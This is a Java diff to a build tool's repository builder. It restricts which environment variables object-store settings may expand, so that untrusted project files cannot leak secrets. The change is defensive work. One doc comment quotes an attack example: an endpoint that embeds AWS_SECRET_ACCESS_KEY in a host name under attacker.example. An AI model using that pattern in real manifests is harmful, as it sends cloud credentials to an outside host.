@@ -4,6 +4,7 @@ package cc.jumpkick.runtime;
 import cc.jumpkick.cache.Cas;
 import cc.jumpkick.config.BuildEnv;
 import cc.jumpkick.config.GlobalConfig;
+import cc.jumpkick.config.Interpolation;
 import cc.jumpkick.config.JkBuildParseException;
 import cc.jumpkick.config.RepositoryToml;
 import cc.jumpkick.credential.RepoCredential;
@@ -25,6 +26,8 @@ import java.util.LinkedHashMap;
 import java.util.LinkedHashSet;
 import java.util.List;
 import java.util.Map;
+import java.util.Optional;
+import java.util.Set;
 import java.util.function.Function;
 import org.jspecify.annotations.Nullable;
 
@@ -59,14 +62,64 @@ public final class RepoGroupBuilder {
     private RepoGroupBuilder() {}
 
     /**
-     * Expand {@code ${VAR}} in object-store credentials under {@link RepositoryToml.VarPolicy#STRICT}:
-     * an unset variable is a {@link JkBuildParseException} naming the
-     * {@code repositories.<name>} position, rather than a silent null that would fall through to
-     * the ambient AWS chain and fail far away from the cause.
+     * The object-store settings {@code spec} contributes, with its {@code ${VAR}} references
+     * expanded under the same provenance rule as an inline credential — the resolver's
+     * {@link RepoCredentialResolver#userDeclaration} and {@link RepoCredentialResolver#projectMayRead},
+     * so the two cannot drift.
+     *
+     * <p>Every one of the five keys is under the rule, not only the three that name a credential:
+     * a region rides the SigV4 credential scope in clear and an endpoint becomes a host name to
+     * resolve, so {@code endpoint = "https://${AWS_SECRET_ACCESS_KEY}.attacker.example"} beside
+     * {@code url = "s3://attacker-bucket/"} in a cloned project would leak on the first resolve
+     * exactly as {@code secret-key} would. Literal values are the declaring manifest's own and are
+     * used as written. A user-config declaration of the repository at this origin supplies its own
+     * object-store table instead, whatever the project wrote. A project's references may name only
+     * the repository's {@code JK_REPO_<ID>_*} variables under a binding; otherwise the keys that
+     * carry a reference are left unset — the transport falls back to the ambient chain, or goes
+     * unsigned — and the literal keys stay.
+     *
+     * <p>Admitted references expand under {@link RepositoryToml.VarPolicy#STRICT}: an unset
+     * variable is a {@link JkBuildParseException} naming the {@code repositories.<name>} position,
+     * rather than a silent null that would fall through to the ambient AWS chain and fail far away
+     * from the cause.
      */
     static ObjectStoreConfig expandObjectStore(
+            RepositorySpec spec, RepoCredentialResolver creds, Function<String, @Nullable String> env) {
+        ObjectStoreConfig declared = spec.objectStoreOpt().orElse(ObjectStoreConfig.EMPTY);
+        if (declared.isEmpty()) return ObjectStoreConfig.EMPTY;
+        Set<String> references = referencesIn(declared);
+        if (references.isEmpty()) return declared;
+        Optional<ObjectStoreConfig> own =
+                creds.userDeclaration(spec.name(), spec.url()).flatMap(RepositorySpec::objectStoreOpt);
+        if (own.isPresent()) return expandStrictly(spec.name(), own.get(), env);
+        if (creds.projectMayRead(spec.name(), spec.url(), references)) {
+            return expandStrictly(spec.name(), declared, env);
+        }
+        return new ObjectStoreConfig(
+                literalOrNull(declared.region()),
+                literalOrNull(declared.endpoint()),
+                literalOrNull(declared.accessKey()),
+                literalOrNull(declared.secretKey()),
+                literalOrNull(declared.sessionToken()));
+    }
+
+    /** Every {@code ${VAR}} name the five object-store keys carry, in key order. */
+    private static Set<String> referencesIn(ObjectStoreConfig cfg) {
+        Set<String> names = new LinkedHashSet<>();
+        for (String value :
+                new String[] {cfg.region(), cfg.endpoint(), cfg.accessKey(), cfg.secretKey(), cfg.sessionToken()}) {
+            if (value != null) names.addAll(Interpolation.references(value));
+        }
+        return names;
+    }
+
+    /** {@code value} when it is written out in full; null when it references a variable that was refused. */
+    private static @Nullable String literalOrNull(@Nullable String value) {
+        return value == null || Interpolation.references(value).isEmpty() ? value : null;
+    }
+
+    private static ObjectStoreConfig expandStrictly(
             String repoName, ObjectStoreConfig cfg, Function<String, @Nullable String> env) {
-        if (cfg == null || cfg.isEmpty()) return ObjectStoreConfig.EMPTY;
         String where = "repositories." + repoName;
         RepositoryToml.VarPolicy strict = RepositoryToml.VarPolicy.STRICT;
         return new ObjectStoreConfig(
@@ -130,12 +183,10 @@ public final class RepoGroupBuilder {
                 // Per-repo object-store config (region/endpoint/keys) flows to the
                 // transport; HTTP credentials still ride the MavenRepo credential.
                 // Object-store keys carry raw ${VAR} out of the parse for the same reason
-                // credentials dothey are secrets, so they must not be committed
-                // literally, and expansion belongs where the request's environment is in scope.
-                RepoTransport transport = RepoTransports.forUrl(
-                        spec.url(),
-                        http,
-                        expandObjectStore(spec.name(), spec.objectStoreOpt().orElse(ObjectStoreConfig.EMPTY), env));
+                // credentials do: they are secrets, so they must not be committed literally, and
+                // expansion belongs where the request's environment is in scope — and under the
+                // resolver's provenance rule, so a project names only its own variables.
+                RepoTransport transport = RepoTransports.forUrl(spec.url(), http, expandObjectStore(spec, creds, env));
                 // Hand the client through, not just the transport: the transport-only constructor nulls it,
                 // which silently disabled the metadata TTL cache and the ~/.m2 probe for every real
                 // build.
